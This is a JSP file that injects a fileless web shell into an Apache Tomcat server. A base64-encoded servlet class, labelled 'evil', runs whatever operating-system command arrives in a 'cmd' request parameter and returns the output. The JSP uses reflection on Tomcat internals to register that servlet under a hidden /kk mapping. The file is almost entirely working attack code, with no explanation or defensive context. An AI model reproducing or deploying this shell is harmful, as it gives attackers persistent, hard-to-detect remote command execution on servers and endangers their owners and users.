<%--
  Created by IntelliJ IDEA.
  User: liufei
  Date: 2020/11/24
  Time: 11:32
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.*" %>
<%@ page import="org.apache.catalina.webresources.StandardRoot" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.mapper.Mapper" %>
<%@ page import="org.apache.catalina.loader.WebappClassLoaderBase" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap " %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.core.*" %>

<%
    String evil_base64="yv66vgAAADQAwAoAJQBYCABZCwBaAFsIAFwKAF0AXgoACQBfCABgCgAJAGEHAGIIAGMIAGQIAGUIAGYKAGcAaAoAZwBpCgBqAGsHAGwKABEAbQgAbgoAEQBvCgARAHAKABEAcQgAcgsAcwB0CgB1AHYKAHUAdwcAeAoAeQB6CAB7CgB8AH0KAH4AfwoAfgCACgCBAIIKAIMAhAkAXQCFCgCGAIcHAIgBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFAAAAAAAAAAEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkx0ZXN0OwEABGluaXQBAApFeGNlcHRpb25zBwCJAQAFZG9HZXQBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAHaXNMaW51eAEAAVoBAAVvc1R5cAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwBiBwA8BwCKBwBsBwB4BwCLBwCMBwCNAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQALaW5wdXRTdHJlYW0BAAVieXRlcwEAAltCAQAEY29kZQEAClNvdXJjZUZpbGUBAAl0ZXN0LmphdmEMACsALAEAA2NtZAcAiwwAjgCPAQAHb3MubmFtZQcAkAwAkQCPDACSAJMBAAN3aW4MAJQAlQEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwCWDACXAJgMAJkAmgcAmwwAnACdAQARamF2YS91dGlsL1NjYW5uZXIMACsAngEAAlxBDACfAKAMAKEAogwAowCTAQAABwCMDACkAKUHAKYMAKcAqAwAqQAsAQAEdGVzdAcAqgwAqwCsAQAKdGVzdC5jbGFzcwcArQwArgCvBwCKDACwALEMALIAswcAtAwAtQC4BwC5DAC6ALsMALwAvQcAvgwAvwCoAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JbnB1dFN0cmVhbQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAPamF2YS9sYW5nL0NsYXNzAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQATZ2V0UmVzb3VyY2VBc1N0cmVhbQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvaW8vSW5wdXRTdHJlYW07AQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABShbQilJAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuACEAGwAlAAAAAQAaACYAJwABACgAAAACACkABAABACsALAABAC0AAAAvAAEAAQAAAAUqtwABsQAAAAIALgAAAAYAAQAAAAsALwAAAAwAAQAAAAUAMAAxAAAAAQAyACwAAgAtAAAAKwAAAAEAAAABsQAAAAIALgAAAAYAAQAAABAALwAAAAwAAQAAAAEAMAAxAAAAMwAAAAQAAQA0AAEANQA2AAIALQAAAYMABQAJAAAAqSsSArkAAwIAxgCgBD4SBLgABToEGQTGABIZBLYABhIHtgAImQAFAz4dmQAfBr0ACVkDEgpTWQQSC1NZBSsSArkAAwIAU6cAHAa9AAlZAxIMU1kEEg1TWQUrEgK5AAMCAFM6BbgADhkFtgAPtgAQOga7ABFZGQa3ABISE7YAFDoHGQe2ABWZAAsZB7YAFqcABRIXOggsuQAYAQAZCLYAGSy5ABgBALYAGrEAAAADAC4AAAAyAAwAAAATAAsAFAANABUAFAAWACYAFwAoABkAYwAaAHAAGwCAABwAlAAdAJ8AHgCoACIALwAAAFwACQANAJsANwA4AAMAFACUADkAOgAEAGMARQA7ADwABQBwADgAPQA+AAYAgAAoAD8AQAAHAJQAFABBADoACAAAAKkAMAAxAAAAAACpAEIAQwABAAAAqQBEAEUAAgBGAAAALgAG/QAoAQcARx9YBwBI/gAuBwBIBwBJBwBKQQcAR/8AFQADBwBLBwBMBwBNAAAAMwAAAAYAAgA0AE4ACQBPAFAAAgAtAAAAhAACAAQAAAAoEhu2ABwSHbYAHkwrtgAfvAhNKyy2ACBXuAAhLLYAIk6yACMttgAksQAAAAIALgAAABoABgAAACUACwAmABIAJwAYACgAIAApACcAKgAvAAAAKgAEAAAAKABRADwAAAALAB0AUgA+AAEAEgAWAFMAVAACACAACABVADoAAwAzAAAABAABAE4AAgBWAAAAAgBXALcAAAAKAAEAgwCBALYACQ==";
    java.lang.ClassLoader classLoader = (java.lang.ClassLoader) Thread.currentThread().getContextClassLoader();
    java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    defineClass.setAccessible(true);
    byte[] evil_bytes = java.util.Base64.getDecoder().decode(evil_base64);
    // defineClass.invoke(classLoader, evil_bytes, 0, evil_bytes.length);
    Servlet servlet = (Servlet) Class.forName("test").newInstance();

    StandardContext context = (StandardContext)((StandardRoot)((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources()).getContext();
    Field appcontextF = context.getClass().getDeclaredField("context");
    appcontextF.setAccessible(true);
    ApplicationContext appcontext = (ApplicationContext) appcontextF.get(context);

    Field serviceF = appcontext.getClass().getDeclaredField("service");
    serviceF.setAccessible(true);
    StandardService service = (StandardService) serviceF.get(appcontext);

    Mapper mapper = service.getMapper();

    Class[] classes = mapper.getClass().getDeclaredClasses();
    Class contextversion = classes[1];
    Method addWrapper = mapper.getClass().getDeclaredMethod("addWrapper", contextversion, String.class, Wrapper.class, boolean.class, boolean.class);

    Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField("contextObjectToContextVersionMap");
    contextObjectToContextVersionMapF.setAccessible(true);
    ConcurrentHashMap  contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);

    Object contextVersion = contextObjectToContextVersionMap.get(context);


    StandardWrapper wrappershell = (StandardWrapper) context.createWrapper();
    wrappershell.setLoadOnStartup(1);
    wrappershell.setServletName("really");
    wrappershell.setServlet(servlet);
    wrappershell.setServletClass(Class.forName("test").getName());

    Field parent = ContainerBase.class.getDeclaredField("parent");
    parent.setAccessible(true);
    parent.set(wrappershell, context);

    context.addServletMapping("/kk", "really");
    context.addChild(wrappershell);

%>

